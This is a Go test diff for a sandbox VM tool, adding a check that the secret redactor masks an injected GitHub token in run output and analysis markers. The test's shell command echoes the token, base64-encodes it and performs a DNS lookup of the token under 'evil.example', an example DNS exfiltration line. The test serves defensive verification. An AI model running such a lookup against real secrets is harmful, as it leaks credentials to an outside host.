@@ -1173,3 +1173,28 @@ func TestDevLiveNetworkOnVM(t *testing.T) {
 		t.Errorf("helpers left after stop:\n%s", left.String())
 	}
 }
+
+// TestRunSecretsOnVM: a run gets the config's secrets in its environment,
+// and neither its output nor the markers analysis reads carry a value, in
+// any of the forms the redactor knows.
+func TestRunSecretsOnVM(t *testing.T) {
+	ctx := context.Background()
+	if ok, _ := doctor(ctx, io.Discard); !ok {
+		t.Skip("the sbox VM is not ready: run sbox setup")
+	}
+	const token = "ghp_sboxVMTest0123456789abc"
+	job := guestJob{command: []string{"sh", "-c", `echo "$GITHUB_TOKEN"; printf %s "$GITHUB_TOKEN" | base64; getent hosts "$GITHUB_TOKEN.evil.example"; true`},
+		secrets: map[string]string{"GITHUB_TOKEN": token}}
+	var out, errOut bytes.Buffer
+	res, err := runVM(ctx, t.TempDir(), job, 30*time.Second, false, &out, &errOut)
+	if err != nil || res.exitCode != 0 {
+		t.Fatalf("run: %v, exit %d: %s", err, res.exitCode, errOut.String())
+	}
+	if out.String() != "│ [redacted:GITHUB_TOKEN]\n│ [redacted:GITHUB_TOKEN]\n" {
+		t.Errorf("output %q, want both forms redacted", out.String())
+	}
+	all := out.String() + strings.Join(res.markers, "\n")
+	if strings.Contains(all, token) || !strings.Contains(strings.Join(res.markers, "\n"), "[redacted:GITHUB_TOKEN].evil.example") {
+		t.Errorf("markers %q: want the lookup with the token redacted", res.markers)
+	}
+}
